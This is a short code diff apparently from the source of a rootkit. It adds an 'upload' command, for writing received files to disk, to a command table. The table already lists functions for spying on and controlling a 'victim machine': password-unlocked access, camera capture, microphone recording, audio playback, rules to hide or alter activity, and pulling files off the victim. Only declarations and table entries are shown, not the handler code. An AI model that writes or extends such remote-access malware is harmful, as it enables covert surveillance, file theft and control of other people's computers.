@@ -33,6 +33,7 @@ static int capture_image_handler(char *args);
 static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
 static int get_file_handler(char *args);
+static int upload_handler(char *args);
 
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
@@ -52,6 +53,7 @@ static struct command rootkit_commands_array[] = {
     { "play_audio", 10, "play an audio file", 40, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
     { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
+    { "upload", 6, "receive a file and save it on disk", 40, upload_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
